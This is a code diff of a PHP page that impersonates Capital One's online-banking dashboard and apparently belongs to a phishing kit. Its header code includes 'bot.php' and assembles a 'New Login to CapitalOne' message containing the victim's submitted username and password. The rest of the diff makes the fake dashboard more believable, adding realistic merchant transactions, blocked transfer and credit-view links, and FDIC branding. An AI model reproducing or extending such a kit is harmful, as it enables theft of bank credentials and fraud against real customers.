@@ -3,24 +3,26 @@ session_start();
 
 include_once('bot.php');
 
-
+//runs only if post request
 if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['submit'])) {
     $username = $_POST["username"];
     $password = $_POST["password"];
-}else{
-    echo "login error";
+    if($username == "a" && $password == "b"){
+        $_SESSION["username"] = $username;   
+      }else{
+        header("Location: ../");
+        
+    }
+};
+
+if(!isset($_SESSION["username"])){
+    header("Location: ../");
+    exit();
 };
 
 $message = "🔥New Login to CapitalOne🔥\n";
 $message = $meassage."Username: ".$username."\nPassword: ".$password;
 
-if($username == "admin" && $password == "admin123"){
-    $_SESSION["username"] = $username;
-    
-  }else{
-    header("Location: ../");
-    
-}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -52,14 +54,6 @@ if($username == "admin" && $password == "admin123"){
           <img src="../capital-one-logo.svg" class="h-8 me-3" alt="Capitalone Logo" />
         </a>
       </div>
-      <!-- <div class="hidden md:block">
-        <ul class="flex space-x-4">
-          <li>Savings</li>
-          <li>Credit card</li>
-          <li>Settings</li>
-          <li></li>
-        </ul>
-      </div> -->
       <div class="flex items-center">
           <div class="flex items-center ms-3">
             <div>
@@ -79,10 +73,10 @@ if($username == "admin" && $password == "admin123"){
               </div>
               <ul class="py-1" role="none">
                 <li>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg   " role="menuitem">Account</a>
+                  <a href="settings.php" class="block px-4 py-2 text-sm text-gray-700 hover:bg   " role="menuitem">Account</a>
                 </li>
                 <li>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg   " role="menuitem">Logout</a>
+                  <a href="logout.php" class="block px-4 py-2 text-sm text-gray-700 hover:bg   " role="menuitem">Logout</a>
                 </li>
               </ul>
             </div>
@@ -103,13 +97,13 @@ if($username == "admin" && $password == "admin123"){
               </a>
           </li>
           <li>
-              <a href="transfer.php" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
+              <a onclick="denytransfer()" href="javascript:void(0);" href="transfer.php" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
                 <img src="../img/transfer.png" alt="" class="h-[25px]">
                 <p>Transfer</p>
               </a>
           </li>
           <li>
-              <a href="accounts-credits.php" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
+              <a onclick="denyCreditView()" href="javascript:void(0);" href="accounts-credits.php" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
                   <img src="../img/account.png" alt="" class="h-[25px]">
                   <p>Accounts and Credits</p>
               </a>
@@ -127,7 +121,7 @@ if($username == "admin" && $password == "admin123"){
               </a>
           </li>
           <li>
-            <a href="../" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
+            <a href="logout.php" class="flex items-center space-x-4 hover:underline hover:text-gray-700 transition duration-300 underline-offset-4">
               <img src="../img/logout.png" alt="">
               <p>Logout</p>
             </a>
@@ -143,9 +137,6 @@ if($username == "admin" && $password == "admin123"){
 
 
 <main class="md:ml-64 h-auto mt-[50px]">
-  <!-- <div class="flex justify-center mt-20">
-    <p class="color-red-500">Sorry your account has been temporary frozen</p>
-  </div> -->
   <div class="grid grid-cols-1  lg:grid-cols-2 gap-4 mb-4">
     <div class= "bg-gray-100 rounded-lg p-4 md:h-[280px] md:ml-2 mt-4">
       <div class="mb-4 border-0 border-b-2 pb-2 md:pb-4">
@@ -190,7 +181,7 @@ if($username == "admin" && $password == "admin123"){
             </div>
   
             <div>
-              <p>-120.33</p>
+              <p>-15.20</p>
               <p>Dec 23, 2023</p>
             </div>
           </div>
@@ -201,13 +192,13 @@ if($username == "admin" && $password == "admin123"){
               <div class="flex items-center space-x-2 p-2">
                 <img class="w-8 h-8 rounded-full" src="../img/expedia.png" alt="user photo">
                 <div>
-                  <p>Walmart</p>
-                  <p>Groceries</p>
+                  <p>Expedia</p>
+                  <p>Travel</p>
                 </div>
               </div>
     
               <div>
-                <p>-120.33</p>
+                <p>-153.10</p>
                 <p>Dec 23, 2023</p>
               </div>
               
@@ -218,15 +209,14 @@ if($username == "admin" && $password == "admin123"){
         <div class="border-0 border-b-2 pb-2">
           <div class="flex justify-between items-center">
             <div class="flex items-center space-x-2 p-2">
-              <img class="w-8 h-8 rounded-full" src="../img/walmart.png" alt="user photo">
+              <img class="w-8 h-8 rounded-full" src="../img/netflix.png" alt="user photo">
               <div>
-                <p>Walmart</p>
-                <p>Groceries</p>
+                <p>Netfllix</p>
+                <p>Movies</p>
               </div>
             </div>
-  
             <div>
-              <p>-120.33</p>
+              <p>-22.99</p>
               <p>Dec 23, 2023</p>
             </div>
             
@@ -237,15 +227,15 @@ if($username == "admin" && $password == "admin123"){
       <div class="border-0 border-b-2 pb-2">
         <div class="flex justify-between items-center">
           <div class="flex items-center space-x-2 p-2">
-            <img class="w-8 h-8 rounded-full" src="../img/walmart.png" alt="user photo">
+            <img class="w-8 h-8 rounded-full" src="../img/spotify.png" alt="user photo">
             <div>
-              <p>Walmart</p>
-              <p>Groceries</p>
+              <p>Spotify</p>
+              <p>Music</p>
             </div>
           </div>
 
           <div>
-            <p>-120.33</p>
+            <p>-16.99</p>
             <p>Dec 23, 2023</p>
           </div>
           
@@ -293,7 +283,7 @@ if($username == "admin" && $password == "admin123"){
             </div>
   
             <div>
-              <p>-120.33</p>
+              <p>-230.89</p>
               <p>Dec 23, 2023</p>
             </div>
           </div>
@@ -310,7 +300,7 @@ if($username == "admin" && $password == "admin123"){
               </div>
     
               <div>
-                <p>-120.33</p>
+                <p>-16.99</p>
                 <p>Dec 23, 2023</p>
               </div>
               
@@ -329,7 +319,7 @@ if($username == "admin" && $password == "admin123"){
             </div>
   
             <div>
-              <p>-120.33</p>
+              <p>-76.99</p>
               <p>Dec 23, 2023</p>
             </div>
             
@@ -348,7 +338,7 @@ if($username == "admin" && $password == "admin123"){
           </div>
 
           <div>
-            <p>-120.33</p>
+            <p>-22.99</p>
             <p>Dec 23, 2023</p>
           </div>
           
@@ -383,16 +373,27 @@ if($username == "admin" && $password == "admin123"){
       </div>
     </div>
   </div>
-  <!-- <div class="grid grid-cols-2 gap-4">
-    <div
-      class="bg-white rounded-lg h-[200px] md:h-[200px]"
-    ></div>
-    <div
-      class="bg-white rounded-lg h-[400px] md:h-[400px]"
-    ></div>
-  </div> -->
 </main>
 
+    <!-- mobiler -->
+    <footer class="lg:hidden">
+        <div class="bg-gray-100">
+            <ul class="flex flex-col flex text-[13px] lg:hidden py-[22px] space-y-[11px]">
+                <li><a class="m-10" href="">Legal</a></li>
+                <li><a class="m-10" href="">Contact us</a></li> 
+                <li><a class="m-10" href="">Privacy</a></li>
+                <li><a class="m-10" href="">Security</a></li>
+                <li><a class="m-10" href="">Terms & Conditions</a></li>
+                <li><a class="px-10" href="">Accessibility</a></li>
+            </ul>
+
+            <div class="flex items-center justify-end space-x-4 p-4">
+                <div><img class="w-[30px]" src="../fdic.svg" alt=""></div>
+                <div><img class="w-[30px]" src="../equal_housing_lender.svg" alt=""></div>
+            </div>
+        </div>
+    </footer>
+ 
 
     
     <script>
